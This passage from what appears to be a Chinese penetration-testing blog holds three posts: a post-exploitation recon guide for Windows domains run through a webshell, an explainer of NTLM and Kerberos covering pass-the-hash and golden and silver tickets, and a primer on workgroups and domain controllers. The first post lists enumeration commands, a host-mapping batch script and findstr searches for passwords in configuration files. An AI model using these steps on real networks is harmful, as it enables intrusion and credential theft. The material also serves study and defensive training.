+<p>如果有条件的情况下,可以跟踪下路由,看看出口的公网ip,时间可能比较长(毕竟一跳一跳的走,中间一个超时就会卡很久),如果是菜刀可能会超时<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># tracert www.google.com</span></div></pre></td></tr></table></figure></p>
+<p>查看当前机器都起了哪些进程,主要是想看看用的什么杀软,什么监控,什么服务等等……心里先有个底<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># tasklist /svc</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/tasklist svc.jpg" alt="&#39;&#39;"></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># tasklist /V  看下发起进程的用户身份,当然,你只能看到你有权限看到的</span></div></pre></td></tr></table></figure>
+<p><img src="/img/tasklist v.jpg" alt="&#39;&#39;"></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># wmic process where name='*.exe' list full   查询某个进程所对应某个具体的可执行程序是什么</span></div></pre></td></tr></table></figure>
+<p><img src="/img/wicic exe.jpg" alt="&#39;&#39;"></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># hostname 	  查看当前机器的主机名</span></div><div class="line"><span class="comment"># net start 	  查看当前系统已经启动的一些服务,注意这里的*scanner,很显然,已经有同行搞过,信心是不是有大了一点呢,嘿嘿……</span></div><div class="line"><span class="comment"># net session 	  查看当前系统正在连接的会话有哪些,权限要够,菜刀用的组件可能权限不允许,换大马会好点</span></div><div class="line"><span class="comment"># net user	  查看本地所有的用户名</span></div><div class="line"><span class="comment"># net localgroup  查看本地所有的组名</span></div><div class="line"><span class="comment"># net localgroup "administrators" 查看指定组中的所有成员</span></div><div class="line"><span class="comment"># net localgroup "remote desktop users" 远程桌面组,如果你想要某个用户能进行远程桌面连接,可能需要把它加到该组中</span></div><div class="line"><span class="comment"># net accounts 	  查看本机的账号密码设置策略,添加用户的时候可能要注意下</span></div><div class="line"><span class="comment"># route print     打印下当前系统路由信息</span></div><div class="line"><span class="comment"># schtasks /query /fo list /v    查看本机的计划任务列表,win7以后就淘汰at了,不得不说schtasks是个非常好用的工具</span></div></pre></td></tr></table></figure>
+<p>找当前用户可读写目录,可能会很多,一般把根放在网站目录就好了,当然,你也可以传一些目录读写查询的小脚本来搞<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># dir /a-r-d /s /b</span></div></pre></td></tr></table></figure></p>
+<p>setuid程序探测<br></p>
+<p>除此之外,千万别忘了多去菜刀里面翻翻目录文件,兴趣能还能找到点儿有用的东西,有权限的情况下能翻多深就翻多深,另外,确实还有很多专门针对提权方面的系统信息探测,篇幅限制,到时会再单独拿出来做详细说明<br><br></p>
+<p>0x02 搜集域内简要信息(期间务必仔细做好记录):<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># net user /domain 	查看当前域中的所有用户名,根据用户名总数大概判断域的规模</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/net user domain.jpg" alt="&#39;&#39;"></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># net user epoadmin /domain  查看指定用户在当前域中的详细属性信息</span></div></pre></td></tr></table></figure>
+<p><img src="/img/net user epoadmin admin.jpg" alt="&#39;&#39;"></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># net accounts /domain 		查看当前域的域内账户密码设置策略</span></div><div class="line"><span class="comment"># net config workstation       	看看当前的登录域</span></div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># net view 	正常情况下可以用该命令查看当前域中在线的机器有哪些,但这样看着确实不太直观,稍微用批处理搞一下把机器名对应的ip也显示出来,岂不更畅快</span></div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">@echo off</div><div class="line">setlocal ENABLEDELAYEDEXPANSION</div><div class="line">@FOR /F <span class="string">"usebackq eol=- skip=1 delims=\" %%j IN (`net view ^| find "</span>命令成功完成<span class="string">" /v ^|find "</span>The command completed successfully.<span class="string">" /v`) DO (</span></div><div class="line">@FOR /F "usebackq delims=<span class="string">" %%i IN (`@ping -n 1 -4 %%j ^| findstr "</span>Pinging<span class="string">"`) DO (</span></div><div class="line">@FOR /F "usebackq tokens=<span class="number">2</span> delims=[]<span class="string">" %%k IN (`echo %%i`) DO (echo %%k %%j)</span></div><div class="line">)</div><div class="line">)</div></pre></td></tr></table></figure>
+<p><img src="/img/netviewtoip.jpg" alt="&#39;&#39;"></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># net view /domain       		 查看所有的域名称</span></div><div class="line"><span class="comment"># net view /domain:PROGRAM 		 查看指定域中在线的计算机列表</span></div><div class="line"><span class="comment"># net time /domain			 查看主域位置,一般都会把主域作为时间服务器</span></div><div class="line"><span class="comment"># net group /domain			 查看当前域中的所有组名</span></div><div class="line"><span class="comment"># net group "domain admins" /domain 	 看看当前域中的域管都有谁</span></div><div class="line"><span class="comment"># net group "domain computers" /domain 	 看看当前域中的所有的计算机名,应该是只要登录过该域计算机名都会被保存下来</span></div><div class="line"><span class="comment"># net group "domain controllers" /domain 看看域控是哪几个</span></div><div class="line"><span class="comment"># nltest /domain_trusts 		 查看域信任关系</span></div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># dsquery computer 				   查看当前域内的所有机器,dsquery工具一般在域控上才有,不过你可以上传一个和目标系统版本对应的dsquery</span></div><div class="line"><span class="comment"># dsquery user 					   查看当前域中的所有账户名</span></div><div class="line"><span class="comment"># dsquery group 				   查看当前域内的所有组名</span></div><div class="line"><span class="comment"># dsquery subnet 				   查看到当前域所在的网段</span></div><div class="line"><span class="comment"># dsquery site 					   查看域内网站</span></div><div class="line"><span class="comment"># dsquery server				   查看当前域中的所有服务器(应该是指域控)</span></div><div class="line"><span class="comment"># dsquery user domainroot -name admin* -limit 240  查询前240个以admin开头的用户名</span></div></pre></td></tr></table></figure>
+<p>0x03 尽可能多的搜集本机的各种密码数据,关键字大家随意,这里只是给几个常见的:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># dir /b /s config.* 			搜集本机所有的配置文件路径</span></div><div class="line"><span class="comment"># dir /b /s login*txt 			也有一些管理员笔记喜欢用txt记录一些服务配置或者密码信息</span></div><div class="line"><span class="comment"># dir /b /s login*			所有带有login字段的文件名</span></div><div class="line"><span class="comment"># dir /b /s *.bak			所有以bak为后缀的的文件名</span></div><div class="line"><span class="comment"># dir /b /s *.config            	所有以config为后缀的文件名</span></div></pre></td></tr></table></figure></p>
+<p>在所有后缀为asp,ini,txt,php,aspx……的文件中找到带有password字符串文件,查询的时间可能会比较长,菜刀可能又会超时,另外,这样这里所有的查找都以当前路径为基础的<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># findstr /si password *.ini *.txt *.asp *.cgi  </span></div><div class="line"><span class="comment"># findstr /si password *.ini *.txt *.aspx </span></div><div class="line"><span class="comment"># findstr /si password *.ini *.txt *.php</span></div><div class="line"><span class="comment"># findstr /si password *.ini *.txt *.php *.xml</span></div></pre></td></tr></table></figure></p>
+<p>0x04 更多,待续……</p>
+<p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;关于域内信息搜集这里只是粗略零碎的提到了一些,确实还有很多很精悍的搜集技巧,都没提到,不过,那都是后话,比如,关于内网大致拓扑结构信息,端口服务信息….篇幅原因,压根也没提到,来日方长,我们还是循序渐进吧,’步子太大容易扯着蛋’,这次顶多先入个门,主要还是想借此说明,利用系统现有的工具在现有的权限条件下,我们到底能做些什么,务必要时刻谨记我们搜集信息的初衷(严禁盲目),你所搜到的每个信息,都应该有它存在的价值,也就是说后续我们到底可以拿它些什么,这非常无比的重要,举个简单例子,就拿搜集密码来说,首先我要知道哪些地方可能会存有密码,我们可能知道,各种数据库配置文件有数据库的连接密码(sa&amp;root),各种第三方工具的配置文件中可能也保存的也有密码hash(比如,filezilla之流),浏览器中说不定保存的也有密码各种网站密码(找找有没有是目标网站的,想办法登进去传shell也是可以的),如果你运气不错,搞到了vpn账号密码岂不快哉,等等……其实,在你权限和免杀都没问题的情况下,要搜集的密码还有很多,关于更多搜集密码,猜密码的东西,后续会单独梳理出来,说了这么多废话,最终目的也只是想说明,如果大家只是照本宣科的把命令行尸走肉的过一遍,可以很负责任的告诉大家,几乎是没有任何意义的,不是吗,这里都是一些基础的不能再基础的命令,使用也极其简单,能不能拿到有用的东西,关键还在人,对信息的敏感度一定要高,细心点就好了,再说一遍,’严禁盲目,严禁盲目,严禁盲目’,其实,我也一直在强调,工具是死的,人是活的,知道你想要做什么,比怎么做更重要,这里,仅供参考,有不对的地方,麻烦大家多批评指正,说实话,这样敲命令显的确实有点儿呆萌,你可以选择把它丢到脚本中,一键搞定,不过,容错可能要做好点,万一命令执行异常了(有可能错过重要信息),就不太好了,不过,我自己还是喜欢手工,要什么记录什么就好了,干嘛非要动不动搞一大堆没用的信息,看着都累,希望大家平时也是,务必要勤记录,这绝对是个好习惯,祝大家好运,也非常期待多跟大家一起交流,毕竟,个人的力量始终是有限的</p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/08/10/ntlm-kerberos/">
+                深刻理解windows安全认证机制 [ntlm & Kerberos]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-08-10</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/active-pentest/">active pentest</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br></p>
+<p>0x01 为什么要理解windows 安全认证机制:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">加深对后续各种漏洞利用的理解深度,还是那句话,要知其然,更要知其所以然,不废话,咱们直接开始</div></pre></td></tr></table></figure></p>
+<p>0x02 windows认证协议主要有以下两种:<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">基于ntlm的认证方式,主要用在早期的windows工作组环境中,认证的过程也相对比较简单</div><div class="line">另一种是基于Kerberos的认证方式,主要用在域环境中,下面就这两种不同的认证方式做些简要的通信流程说明</div></pre></td></tr></table></figure></p>
+<p>0x03 关于ntlm认证流程简要说明,如下:<br><img src="/img/ntlm-auth.png" alt="&#39;&#39;"></p>
+<p>0x04 从图中我们可以清晰的看到,ntlm在域中的认证过程主要分为以下几步:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">第一步,首先在client输入username,password和domain,然后client会把password hash后的值先缓存到本地</div><div class="line">第二步,之后,client把username的明文发送给server(DC)</div><div class="line">第三步,DC会生成一个<span class="number">16</span>字节的随机数,即challenge(挑战码),再传回给client</div><div class="line">第四步,当client收到challenge以后,会先复制一份出来,然后和缓存中的密码hash再一同混合hash一次,混合后的值称为response,之后client再将challenge,response及username一并都传给server</div><div class="line">第五步,server端在收到client传过来的这三个值以后会把它们都转发给DC</div><div class="line">第六步,当DC接到过来的这三个值的以后,会根据username到域控的账号数据库(ntds.dit)里面找到该username对应的hash,然后把这个hash拿出来和传过来的challenge值再混合hash</div><div class="line">第七步,将(<span class="number">6</span>)中混合后的hash值跟传来的response进行比较,相同则认证成功,反之,则失败,当然,如果是本地登录,所有验证肯定也全部都直接在本地进行了</div></pre></td></tr></table></figure></p>
+<p>0x05 关于ntlm的一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;它是一种基于挑战（challenge）/响应（response）消息交互模式的认证过程,从整个认证过程来看,安全确实不怎么到位,也就是说入侵者只需要拿到一个系统管理员的hash,直接给dc认证就好了,反正账户名和域名都知道,早期的pass the hash (psexec)确实就是通过这种方式来进行的,如果本地管理员的账号密码相同,其实不用密码一样可以被认证,我们所要做的就是不断通过这种方式来尝试拓展内网的其他机器,直到控制整个域,但后来的kb2871997,似乎改变了一些现状,但也可能只是似乎</p>
+<p>0x06 关于kerberos的一些概述:<br>&nbsp;&nbsp;&nbsp;&nbsp;相对于ntlm而言,kerberos的认证方式就要复杂的多,因为它提供了一个集中式的认证方式,在整个认证过程中总共要涉及到三方:客户端,服务端和KDC [Key Distribution Center 密钥分发中心], 在Windows域环境中,KDC的角色由DC(Domain Controller[域控])来担任,Kerberos是一种基于<code>票据</code>的认证方式,票据(Ticket)是用来安全的在认证服务器和用户请求的服务之间传递用户的身份,同时也会传递一些附加信息,用来保证使用Ticket的用户必须是Ticket中指定的用户,Ticket一旦生成,在生存时间内可以被Client多次使用来申请同一个Server的服务(票据窃取问题)</p>
+<p>0x07 kerberos的大致工作流程:<br>&nbsp;&nbsp;&nbsp;&nbsp;说到这里,我们大概也能明白,域中的客户端要想访问同域中的某个服务器资源时,需要首先购买该服务端认可的票据,也就是说,客户端在访问服务器之前需要预先买好票,等待服务验票之后才能入场,但是这张票不能直接购买,还需要一张认购权证,也就是说客户端在买票之前需要预先获得一张认购权证,这张认购权证和进入服务器的入场券均有KDC发售,下面就以下图来做简要说明:<br><img src="/img/kerbos.png" alt="&#39;&#39;"><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>)首先,客户端(client)将域用户的密码hash一次并保存,然后,以此hash来作为客户端和KDC之间的长期共享密钥[kc](当然,在DC上也保存着同样的一条hash)</div><div class="line"><span class="number">2</span>)之后,客户端(client)开始利用(<span class="number">1</span>)中的域用户密码hash再把时间戳,clientid,TGS id等信息混合hash一次,然后向as(认证服务器 [Authentication Server])服务器进行请求</div><div class="line"><span class="number">3</span>)as接到该请求后,利用长期共享密钥(kc)进行解密,解密成功后,会返回给客户端两个票据</div><div class="line">  (<span class="number">1</span>)加密的K(c,tgs)(用于客户端后续向KDC发起请求),TGS Name/ID,时间戳等,该票据由Kc加密</div><div class="line">  (<span class="number">2</span>)票据授予票据(Ticket Granting Ticket,简称TGT),该票据是给TGS的,票据的内容包括K(c,tgs),Client身份信息,域名,时间戳等,该票据由TGS的秘钥加密,只有TGS能够解密</div><div class="line"><span class="number">4</span>)然后,客户端会利用长期共享密钥解密k(c,tgs),并利用该秘钥加密生成一个Authenticator,内容包括<span class="symbol">:lifetime</span>,时间戳,Client身份信息等,连同从AS获取的TGT一并发送给TGS</div><div class="line"><span class="number">5</span>)TGS利用自身的秘钥解密TGT,获取K(c,tgs),并用K(c,tgs)解密客户端发送的Authenticator,对Client进行认证,如果Client通过了认证,TGS随机生成一个Session Key K(c,s),并产生两个票据</div><div class="line">  (<span class="number">1</span>)服务票据(Ts)<span class="symbol">:</span>这是给服务器的服务票据,由Server秘钥Ks加密,内容包括：K(c,s),Client身份信息,Service ID,时间戳,lifetime等</div><div class="line">  (<span class="number">2</span>)客户端票据(Tc)：该票据由K(c,tgs)加密,内容包括：K(c,s),Server身份信息等</div><div class="line"><span class="number">6</span>)客户端收到tgs的回应后,利用K(c,tgs)解密Tc,获取K(c,s),Server身份信息等,并利用K(c,s)加密生成一个Authenticator发送给Server,内容包括<span class="symbol">:</span>时间戳,Client ID等信息,连同Ts一并发送给Server</div><div class="line"><span class="number">7</span>)Server端在收到Client的请求后,利用自身秘钥Ks解密Ts,得到K(c,s),再利用K(c,s)解密Authenticator,对Client进行认证,如果认证通过,则表示KDC已经允许了此次通信,此时Sever无需与KDC通信,因为Ks为KDC和Sever之间的长期共享秘钥,如果在有效时间内,则此次请求有效</div></pre></td></tr></table></figure>
+<p>0x08 关于kerberos利用方法:</p>
+<p>1) 黄金票据(Golden Ticket)<br>&nbsp;&nbsp;&nbsp;&nbsp;先假设这么一种情况,原先已拿到的域内所有的账户hash,包括krbtgt这个账户,由于有些原因导致域管权限丢失,但好在你还有一个普通域用户权限,碰巧管理员在域内加固时忘记重置krbtgt密码,基于此条件,我们还能利用该票据重新获得域管理员权限,利用krbtgt的HASH值可以伪造生成任意的TGT(mimikatz),能够绕过对任意用户的账号策略,让用户成为任意组的成员,可用于Kerberos认证的任何服务</p>
+<p>2) 白银票据(Silver Ticket)<br>&nbsp;&nbsp;&nbsp;&nbsp;通过观察Kerberos协议的认证过程不难发现,如果我们获取了Server秘钥Ks(服务器口令散列值),就可以跳过KDC的认证，直接伪造票据和目标Server通信</p>
+<p>0x09 关于黄金票据和白银票据的一些区别:<br>1)访问权限不同<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Golden <span class="symbol">Ticket:</span> 伪造TGT,可以获取任何Kerberos服务权限</div><div class="line">Silver <span class="symbol">Ticket:</span> 伪造TGS,只能访问指定的服务</div></pre></td></tr></table></figure></p>
+<p>2)加密方式不同<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Golden Ticket 由Kerberos的Hash加密</div><div class="line">Silver Ticket 由服务账号(通常为计算机账户)Hash加密</div></pre></td></tr></table></figure></p>
+<p>3)认证流程不同<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Golden Ticket 的利用过程需要访问域控,而Silver Ticket不需要</div></pre></td></tr></table></figure></p>
+<p>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;这些其实都是域内渗透最基础的知识,所以觉得大家还是非常有必要多花点儿时间,好好深刻体会一下,另外,微软给我们的建议是,尽量们不要直接使用NTLM,而使用negotiate,如果使用的是negotiate,windows则会先判断kerberos是否可用,如果可用就优先使用kerberos,否则才会使用NTLM,kerberos的安全性确实要比NTLM要高很多</p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/08/09/workgroup-domain-dc/">
+                工作组,域,域控是什么及它们之间的一些关系
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-08-09</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/active-pentest/">active pentest</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h3 id="为什么会出现类似像’工作组’这种东西"><a href="#为什么会出现类似像’工作组’这种东西" class="headerlink" title="为什么会出现类似像’工作组’这种东西?"></a>为什么会出现类似像’工作组’这种东西?</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;在了解工作组的具体细节之前,我们先来假设这么一个场景,你在某个互联网公司上班,公司部门有三四个,公司所有的pc加起来(假设绝大部分都是windows系统),总共有七八十台的样子,另外,还有几部打印机和文件共享服务器,也就是说,在公司整个办公内网中大概有80台机器的样子,好,有了场景,咱们再开始说正题,一天早上,你去上班,你同部门的基友说它最近搞了一批新种子,话说好看的不要不要的,问你想不想一睹风采,眼疾手快的你,当然是欣然接受了,然后你果断让那个基友回去马上给把种子共享出来,这时问题就来了,当你打开电脑,点进网络邻居里面一看,卧槽……七八十台机器,一下子杂乱无章的砸到你面前,为了种子,你翻啊,翻啊,费老劲才找到基友共享的种子(当然,可以直接ip访问他的共享,例子确实有些牵强,但这样说只是为了把今天的重点引出来,原谅表达能力实在不是太好……),这时候你心里肯定在骂那个傻x网管,就不能把各个部门的电脑分门别类的规整好吗,害老子要找半天,没错,这也正是早期工作组出现的意义,当然,它的意义也并非仅限于此<br><br></p>
+<h3 id="那么-到底什么是-‘工作组’"><a href="#那么-到底什么是-‘工作组’" class="headerlink" title="那么,到底什么是 ‘工作组’ ?"></a>那么,到底什么是 ‘工作组’ ?</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;从上面的实例中我们大概了解到,工作组就是把一些具有相同职能(比如,可以按部门,按房间号,按岗位,按操作系统类型等的不同进行分组管理)的机器都放到一个组里,这样以来,在整个办公内网(网络邻居)中的机器的作用就一目了然了,大大提高了我们的工作效率,……是哪个组就在哪个组里呆着,表面上大家各司其职,一切看起来仅仅有条,貌似是挺好的,别着急,先接着往下看<br><br></p>
+<h3 id="工作组的一些特点"><a href="#工作组的一些特点" class="headerlink" title="工作组的一些特点:"></a>工作组的一些特点:</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;在工作组中的每台机器对其自身都拥有绝对的掌控权,也就是说,你可以随意进出任何一个工作组,所谓的工作组只是形式上的把大家放在了一起而已,并不存在真正的集中管理作用,工作组内的每台机器依然是相互独立,互不干涉,各自为政的,举个很简单的例子,假设你和某台ftp服务器处在一个工作组内,因为工作的需要,你经常要到这个ftp上去上传下载各种文件,这时候问题来了,你必须提供一个正确的ftp账号密码给那台ftp服务器去验证,通过以后它才能让你正常的上传下载,假设在同一个工作组内还有其它各种各样的服务器,你要想去这些服务器上干点儿什么事儿,无疑,你还要提供n多个账号密码,试想,如果只是单单几十台机器也许还能够呛接受,但如果是几百台,几万台呢,很显然,我们有限的脑瓜容量绝对不会留着干记密码这种无聊的事情的,那问题又来了,该怎么办呢,这就用到’域’了,先提一嘴,后面再单独说它</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;另外,从上面可知,工作组中的身份验证方式,是直接在被访问的机器上进行的,有个不得不说的有趣事实,当你本地系统的账号密码和工作组的中的某台机器的账号密码恰巧一样时,这时当你在登录状态去访问那台机器,就不再需要提供账号密码,而是直接就能访问到对方的系统资源,虽然这种’撞号’的几率很小,但不代表不可能,再退一步讲,即使你们账号密码不一样,只要你的guest账户处于启用状态(当然啦,默认都是关闭的),且没有更改过guest密码,一样是可以被工作组中的其它机器匿名访问到的,是不是很危险呢,不过,这一点在’域’也会被彻底改变,最后,我们还需要知道的是,一般在装完系统默认就会处在workgroup这个组中,在工作组中的机器使用netbios协议(作用就是把机器名转换为ip)进行通信</p>
+<p><br></p>
+<h3 id="工作组优缺点"><a href="#工作组优缺点" class="headerlink" title="工作组优缺点:"></a>工作组优缺点:</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;优点:它只是形式上的整体(并非真正的安全边界),但相对来说网络性能较高<br>&nbsp;&nbsp;&nbsp;&nbsp;缺点:可以看到,所谓的工作组,实质上还是一盘散沙,基本没有任何安全性可言,如果你想进行安全部署,可能就只能一台一台的来配置,过程非常的繁琐,如果你只是想单单对某个几台机器进行集中管理,那就更麻烦了,因为诸多的原因,所以后来就有了windows’域’</p>
+<h3 id="关于工作组的渗透方式"><a href="#关于工作组的渗透方式" class="headerlink" title="关于工作组的渗透方式:"></a>关于工作组的渗透方式:</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">基于各种形式的服务爆破,嗅探,劫持,社工,等等……,你所能想到的所有内网渗透方式,跟普通的内网渗透并没什么太大区别</div></pre></td></tr></table></figure>
+<h3 id="工作组环境下的简要拓扑说明"><a href="#工作组环境下的简要拓扑说明" class="headerlink" title="工作组环境下的简要拓扑说明:"></a>工作组环境下的简要拓扑说明:</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">处在同一交换机下的 fridend组</div></pre></td></tr></table></figure>
+<p><img src="/img/workgroup.jpg" alt="&#39;&#39;"><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">处在同一交换机下的 guys组 &amp; gals组</div></pre></td></tr></table></figure>
+<p><img src="/img/workgroup1.jpg" alt="&#39;&#39;"><br></p>
+<h3 id="好了-说完工作组-下面就来好好介绍下今天的重点-‘域’"><a href="#好了-说完工作组-下面就来好好介绍下今天的重点-‘域’" class="headerlink" title="好了,说完工作组,下面就来好好介绍下今天的重点 ‘域’:"></a>好了,说完工作组,下面就来好好介绍下今天的重点 ‘域’:</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;相对工作组这种’松散自由’的管理方式来讲,域就是一个权限控制相当严格的’工作组’,你甚至可以把它粗略理解成升级版的’工作组’,大家貌似都喜欢把域叫做’安全边界’,其实,个人觉得这确实已经说的够形象了,因为,相比工作组而言,它有一个更加严格的安全管理控制机制,不像工作组那样,在域内可以很方便的对某台或者几台机器,对某个用户或者几个用户进行非常详细的权限控制,另外,域也不像工作组,如果是工作组,只要处在同一内网下(默认是workgroup组),就可以随意访问组中的机器和共享的资源,但,如果是域,只是单单处在同一内网下,还是远远不够的,如果你想访问域内的资源,就必须先要以一个合法的身份加到域中,然后登陆到该域中才可以,至于你对域内的资源有什么样的权限,还需要看你当前的域用户身份,到这里,相信大家已经大概理解域和工作组之间的区别了<br><br></p>
+<h3 id="那么-问题来了-什么又是-‘域控’-DC即’域控制器’-呢"><a href="#那么-问题来了-什么又是-‘域控’-DC即’域控制器’-呢" class="headerlink" title="那么,问题来了,什么又是 ‘域控’ [DC即’域控制器’]呢?"></a>那么,问题来了,什么又是 ‘域控’ [DC即’域控制器’]呢?</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;简单来讲,在一个机器装上活动目录以后,这个机器就会被称作域控,不过,这里需要注意的是,当一台机器变成域控以后该机器上所有的本地用户将会全部变成域内用户,本地安全策略也会升级为域安全策略,域控是整个域内的通信枢纽,所有的权限身份验证都会集中在域控上,如果域控出了问题,整个域内的通信基本也就瘫痪了,需要单独说明的是,域中用来进行身份验证的账户密码hash也都存在域控上[这也是我们在渗透域的最终目的,导出域内所有用户的账号和hash]<br><br></p>
+<h3 id="域控知道了-那什么又是-‘域管’-呢"><a href="#域控知道了-那什么又是-‘域管’-呢" class="headerlink" title="域控知道了,那什么又是 ‘域管’ 呢?"></a>域控知道了,那什么又是 ‘域管’ 呢?</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;其实,就管理性质而言,跟本地管理员的职责并没什么太大的不同,只不过域管是专门用来管理域控的,就像本地管理员只能用来管理本地系统,个人的认识仅此而已,不对的地方,欢迎大家指正<br><br></p>
+<h3 id="域和dns的关系-dns服务器有点儿类似’中间人’的角色-主要负责转发"><a href="#域和dns的关系-dns服务器有点儿类似’中间人’的角色-主要负责转发" class="headerlink" title="域和dns的关系 [dns服务器有点儿类似’中间人’的角色,主要负责转发]"></a>域和dns的关系 [dns服务器有点儿类似’中间人’的角色,主要负责转发]</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;一般我们在搭建域环境时,中间有个步骤会提示要不要一块把dns服务也装了,个人建议这里最好一起装上,dns在域中的最主要的作用就是为了定位域控制器,让客户端能够找到域控制器,不过我们需要事先在dns上创建一个指向域控制器的区域,然后域内的所有客户机包括域控的dns地址都指向搭建好的dns服务器的ip,这时,当域中的机器进行通信时就会根据这个域名来找到域控制器以及对应的客户机,以此来保证域内的正常通信,其实,你可以可以更简单的理解,dns的主要作用其实就是负责转发,一般情况下,dns服务器和域控制器会处在同一台机器上,其实,也不太建议把它分开装<br><br></p>
+<h3 id="关于父域-子域-目录树-目录林的概念"><a href="#关于父域-子域-目录树-目录林的概念" class="headerlink" title="关于父域,子域,目录树,目录林的概念"></a>关于父域,子域,目录树,目录林的概念</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;父域,子域之间建立信任构成了目录树,目录树与目录树之间建立信任则构成了目录林,核心就在于不管是在林中还是树中,只要他们之间已经建立了信任关系,任何一个域中的机器都可以登录到其它域中<br><br></p>
+<h3 id="关于父域-子域-活动目录树-目录林环境下的简单拓扑图"><a href="#关于父域-子域-活动目录树-目录林环境下的简单拓扑图" class="headerlink" title="关于父域,子域,活动目录树,目录林环境下的简单拓扑图:"></a>关于父域,子域,活动目录树,目录林环境下的简单拓扑图:</h3><p><img src="/img/domain_tree.jpg" alt="&#39;&#39;"><br></p>
